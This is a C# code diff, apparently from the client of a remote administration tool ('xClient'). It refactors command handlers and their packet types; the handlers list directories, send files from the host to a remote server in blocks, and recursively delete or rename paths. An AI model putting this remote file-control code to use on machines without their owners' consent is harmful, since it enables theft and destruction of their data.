@@ -9,7 +9,7 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE DIRECTORIES AND FILES (excluding the program). */
     public static partial class CommandHandler
     {
-        public static void HandleDirectory(Packets.ServerPackets.Directory command, Client client)
+        public static void HandleGetDirectory(Packets.ServerPackets.GetDirectory command, Client client)
         {
             try
             {
@@ -44,16 +44,16 @@ namespace xClient.Core.Commands
                 if (folders.Length == 0)
                     folders = new string[] { DELIMITER };
 
-                new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
+                new Packets.ClientPackets.GetDirectoryResponse(files, folders, filessize).Execute(client);
             }
             catch
             {
-                new Packets.ClientPackets.DirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
+                new Packets.ClientPackets.GetDirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER },
                     new long[] { 0 }).Execute(client);
             }
         }
 
-        public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
+        public static void HandleDoDownloadFile(Packets.ServerPackets.DoDownloadFile command, Client client)
         {
             new Thread(() =>
             {
@@ -61,7 +61,7 @@ namespace xClient.Core.Commands
                 {
                     FileSplit srcFile = new FileSplit(command.RemotePath);
                     if (srcFile.MaxBlocks < 0)
-                        new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
+                        new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                             srcFile.LastError).Execute(client);
 
                     for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
@@ -72,59 +72,69 @@ namespace xClient.Core.Commands
                         byte[] block;
                         if (srcFile.ReadBlock(currentBlock, out block))
                         {
-                            new Packets.ClientPackets.DownloadFileResponse(command.ID,
+                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID,
                                 Path.GetFileName(command.RemotePath), block, srcFile.MaxBlocks, currentBlock,
                                 srcFile.LastError).Execute(client);
                             //Thread.Sleep(200);
                         }
                         else
-                            new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1,
+                            new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1,
                                 srcFile.LastError).Execute(client);
                     }
                 }
                 catch (Exception ex)
                 {
-                    new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
+                    new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, ex.Message)
                         .Execute(client);
                 }
             }).Start();
         }
 
-        public static void HandleDownloadFileCanceled(Packets.ServerPackets.DownloadFileCanceled command, Client client)
+        public static void HandleDoDownloadFileCancel(Packets.ServerPackets.DoDownloadFileCancel command, Client client)
         {
             if (!_canceledDownloads.ContainsKey(command.ID))
             {
                 _canceledDownloads.Add(command.ID, "canceled");
-                new Packets.ClientPackets.DownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
+                new Packets.ClientPackets.DoDownloadFileResponse(command.ID, "", new byte[0], -1, -1, "Canceled").Execute(client);
             }
         }
 
-        public static void HandleRename(Packets.ServerPackets.Rename command, Client client)
+        public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
         {
             try
             {
-                if (command.IsDir)
-                    Directory.Move(command.Path, command.NewPath);
-                else
-                    File.Move(command.Path, command.NewPath);
+                switch (command.PathType)
+                {
+                    case PathType.Directory:
+                        Directory.Delete(command.Path, true);
+                        break;
+                    case PathType.File:
+                        File.Delete(command.Path);
+                        break;
+                }
 
-                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
+                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.Path)), client);
             }
             catch
             {
             }
         }
 
-        public static void HandleDelete(Packets.ServerPackets.Delete command, Client client)
+        public static void HandleDoPathRename(Packets.ServerPackets.DoPathRename command, Client client)
         {
             try
             {
-                if (command.IsDir)
-                    Directory.Delete(command.Path, true);
-                else
-                    File.Delete(command.Path);
+                switch (command.PathType)
+                {
+                    case PathType.Directory:
+                        Directory.Move(command.Path, command.NewPath);
+                        break;
+                    case PathType.File:
+                        File.Move(command.Path, command.NewPath);
+                        break;
+                }
 
-                HandleDirectory(new Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
+                HandleGetDirectory(new Packets.ServerPackets.GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
             }
             catch
             {
